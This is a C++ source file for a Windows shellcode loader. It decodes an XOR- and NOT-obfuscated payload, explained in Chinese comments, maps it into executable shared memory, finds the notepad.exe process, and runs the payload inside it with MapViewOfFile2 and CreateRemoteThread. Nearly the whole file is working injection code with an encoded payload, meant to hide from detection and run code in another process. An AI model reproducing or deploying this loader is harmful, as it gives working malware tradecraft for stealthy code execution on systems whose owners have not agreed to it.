#include <windows.h>
#include <stdio.h>
#include <vector>
#include <iostream>
#include <TlHelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment (lib, "OneCore.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ntdll.lib")
#define KEY 0x01


typedef NTSTATUS(NTAPI* fNtGetNextProcess)(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Flags,
    _Out_ PHANDLE NewProcessHandle
    );

int findMyProc(const char* procname) {
    int pid = 0;
    HANDLE current = NULL;
    char procName[MAX_PATH];

    // resolve function address
    fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");

    // loop through all processes
    while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
        GetProcessImageFileNameA(current, procName, MAX_PATH);
        if (lstrcmpiA(procname, PathFindFileName((LPCSTR)procName)) == 0) {
            pid = GetProcessId(current);
            break;
        }
    }

    return pid;
}


int main(int argc, char** argv)
{
    DWORD pid = (DWORD)argv[1];


    std::vector<unsigned char> xored_input = {
        0xbe,0x0a,0xc1,0xa6,0xb2,0xaa,0x82,0x42,0x42,0x42,0x03,0x13,0x03,0x12,0x10,0x13,0x14,0x0a,0x73,0x90,0x27,0x0a,0xc9,0x10,0x22,0x0a,0xc9,0x10,0x5a,0x0a,0xc9,0x10,0x62,0x0a,0xc9,0x30,0x12,0x0a,0x4d,0xf5,0x08,0x08,0x0f,0x73,0x8b,0x0a,0x73,0x82,0xee,0x7e,0x23,0x3e,0x40,0x6e,0x62,0x03,0x83,0x8b,0x4f,0x03,0x43,0x83,0xa0,0xaf,0x10,0x03,0x13,0x0a,0xc9,0x10,0x62,0xc9,0x00,0x7e,0x0a,0x43,0x92,0xc9,0xc2,0xca,0x42,0x42,0x42,0x0a,0xc7,0x82,0x36,0x25,0x0a,0x43,0x92,0x12,0xc9,0x0a,0x5a,0x06,0xc9,0x02,0x62,0x0b,0x43,0x92,0xa1,0x14,0x0a,0xbd,0x8b,0x03,0xc9,0x76,0xca,0x0a,0x43,0x94,0x0f,0x73,0x8b,0x0a,0x73,0x82,0xee,0x03,0x83,0x8b,0x4f,0x03,0x43,0x83,0x7a,0xa2,0x37,0xb3,0x0e,0x41,0x0e,0x66,0x4a,0x07,0x7b,0x93,0x37,0x9a,0x1a,0x06,0xc9,0x02,0x66,0x0b,0x43,0x92,0x24,0x03,0xc9,0x4e,0x0a,0x06,0xc9,0x02,0x5e,0x0b,0x43,0x92,0x03,0xc9,0x46,0xca,0x0a,0x43,0x92,0x03,0x1a,0x03,0x1a,0x1c,0x1b,0x18,0x03,0x1a,0x03,0x1b,0x03,0x18,0x0a,0xc1,0xae,0x62,0x03,0x10,0xbd,0xa2,0x1a,0x03,0x1b,0x18,0x0a,0xc9,0x50,0xab,0x15,0xbd,0xbd,0xbd,0x1f,0x0a,0xf8,0x43,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x0a,0xcf,0xcf,0x43,0x43,0x42,0x42,0x03,0xf8,0x73,0xc9,0x2d,0xc5,0xbd,0x97,0xf9,0xb2,0xf7,0xe0,0x14,0x03,0xf8,0xe4,0xd7,0xff,0xdf,0xbd,0x97,0x0a,0xc1,0x86,0x6a,0x7e,0x44,0x3e,0x48,0xc2,0xb9,0xa2,0x37,0x47,0xf9,0x05,0x51,0x30,0x2d,0x28,0x42,0x1b,0x03,0xcb,0x98,0xbd,0x97,0x21,0x23,0x2e,0x21,0x6c,0x27,0x3a,0x27,0x42,0xbc,0xbd
    };
    // 解密代码
    // 1. 从变换后的字节数组中取出随机字节，并将其移除
    unsigned char end_byte = xored_input.back();
    xored_input.pop_back();

    // 2. 将变换后的字节数组中除最后一个字节外的所有字节与随机字节进行XOR，得到NOT操作之前的字节数组
    std::vector<unsigned char> not_input_2;
    for (auto b : xored_input) {
        not_input_2.push_back(b ^ end_byte);
    }

    // 3. 进行NOT操作，得到原始的字节数组
    std::vector<unsigned char> output;
    for (auto b : not_input_2) {
        output.push_back(~b);
    }
    output.pop_back();
    unsigned char* my_payload = new unsigned char[output.size() + 1];
    std::copy(output.begin(), output.end(), my_payload);
    my_payload[output.size()] = '\0';
    if (output.back() == 0x00) {
        my_payload[output.size()] = '\0';
    }
    for (size_t i = 0; i < output.size(); ++i) {
        std::cout << std::hex << (int)my_payload[i] << " ";
    }

    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, output.size(), NULL);

    LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, output.size());

    memcpy((PVOID)lpMapAddress, my_payload, output.size());

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, findMyProc("notepad.exe"));//填写要注入的pid

    LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);

    UnmapViewOfFile(lpMapAddress);
    CloseHandle(hMapping);
    return 0;
}